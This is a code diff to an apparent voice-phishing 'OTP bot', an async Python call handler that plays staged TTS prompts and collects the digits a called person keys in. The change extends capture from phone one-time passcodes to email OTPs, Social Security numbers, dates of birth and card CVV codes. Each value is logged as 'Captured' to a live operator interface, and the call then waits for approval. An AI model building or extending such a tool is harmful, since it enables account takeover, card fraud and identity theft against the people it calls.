@@ -922,14 +922,25 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         asyncio.create_task(play_step2_with_retry(session_id, session, call_id, otp_digits))
         
     elif current_step == 2 and status in ["step2", "waiting_pin"]:
-        # Step 2: Collecting OTP digits - accumulate digits one by one
+        # Step 2: Collecting OTP digits or custom info - accumulate digits one by one
         new_digit = dtmf_value.replace("#", "").replace("*", "")
         
         # Get current accumulated digits from session
         current_digits = session.get("otp_digits_collected", "") or ""
         current_digits += new_digit
         
-        logger.info(f"OTP accumulating: current={current_digits}, need={otp_digits} digits")
+        # Get info type label for display
+        info_type = session.get("info_type", "phone_otp")
+        info_labels = {
+            "phone_otp": "Phone OTP",
+            "otp_email": "Email OTP",
+            "ssn": "SSN",
+            "dob": "Date of Birth",
+            "cvv": "CVV"
+        }
+        info_label = info_labels.get(info_type, "Info")
+        
+        logger.info(f"{info_label} accumulating: current={current_digits}, need={otp_digits} digits")
         
         # Update accumulated digits in database
         await db.otp_sessions.update_one(
@@ -938,26 +949,27 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         )
         active_sessions[session_id]["otp_digits_collected"] = current_digits
         
-        # Emit partial OTP to UI
+        # Emit partial info to UI
         await emit_log(session_id, "info", f"🔢 Digit entered: {new_digit} (Total: {current_digits})")
         
         # Check if we have enough digits
         if len(current_digits) >= otp_digits:
-            otp_code = current_digits[:otp_digits]
+            captured_code = current_digits[:otp_digits]
             
             # Stop DTMF capture
             await stop_dtmf_capture(call_id)
             
-            await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
+            # Emit captured info with appropriate label
+            await emit_log(session_id, "otp", f"🔑 {info_label} Captured: {captured_code}", {"otp": captured_code, "info_type": info_type})
             
             # Update to step 3 FIRST before playing TTS
             await db.otp_sessions.update_one(
                 {"id": session_id},
-                {"$set": {"otp_received": otp_code, "current_step": 3, "status": "waiting_approval", "otp_digits_collected": ""}}
+                {"$set": {"otp_received": captured_code, "current_step": 3, "status": "waiting_approval", "otp_digits_collected": ""}}
             )
             active_sessions[session_id]["current_step"] = 3
             active_sessions[session_id]["status"] = "waiting_approval"
-            active_sessions[session_id]["otp_received"] = otp_code
+            active_sessions[session_id]["otp_received"] = captured_code
             
             # Play Step 3 TTS immediately (not as background task)
             await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
